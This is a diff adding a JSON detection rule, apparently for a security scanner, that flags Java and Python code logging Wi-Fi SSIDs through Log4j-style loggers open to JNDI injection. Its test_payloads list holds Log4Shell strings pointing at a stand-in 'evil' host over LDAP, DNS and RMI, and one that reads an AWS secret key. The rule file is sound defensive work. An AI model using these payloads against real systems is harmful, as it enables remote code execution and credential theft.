@@ -1,0 +1,47 @@
+{
+  "class": "wifi_jndi",
+  "name": "JNDI / Expression Language Injection via SSID",
+  "severity": "critical",
+  "description": "SSID logged via Log4j or expression-language-capable logger, enabling JNDI lookup RCE",
+  "cwe": "CWE-917",
+  "zero_click": true,
+  "source_patterns": {
+    "java": [
+      "logger\\.\\w+\\s*\\(.*ssid",
+      "log\\.\\w+\\s*\\(.*ssid",
+      "Logger\\.\\w+\\s*\\(.*ssid",
+      "LogManager.*ssid",
+      "LOG\\.\\w+\\s*\\(.*ssid",
+      "System\\.out\\.print.*ssid",
+      "System\\.err\\.print.*ssid",
+      "Log\\.\\w+\\s*\\(.*ssid",
+      "logger\\.\\w+\\s*\\(.*\\+.*ssid",
+      "String\\.format\\s*\\(.*ssid.*logger"
+    ],
+    "python": [
+      "logging\\.\\w+\\s*\\(.*ssid.*\\$\\{",
+      "logger\\.\\w+\\s*\\(.*ssid.*\\$\\{"
+    ]
+  },
+  "file_patterns": [
+    "**/log4j*.properties",
+    "**/log4j*.xml",
+    "**/logback*.xml",
+    "**/*.java"
+  ],
+  "dependency_check": {
+    "library": "log4j-core",
+    "vulnerable_versions": ">=2.0-beta9,<=2.14.1",
+    "fixed_version": "2.15.0"
+  },
+  "safe_patterns": [
+    "logger\\.\\w+\\s*\\(\\s*\"[^\"]*\"\\s*,\\s*ssid\\s*\\)",
+    "log\\.\\w+\\s*\\(\\s*\".*\\{\\}\"\\s*,\\s*ssid"
+  ],
+  "test_payloads": [
+    "${jndi:ldap://evil/a}",
+    "${jndi:dns://evil/a}",
+    "${jndi:rmi://evil/a}",
+    "${env:AWS_SECRET_KEY}"
+  ]
+}
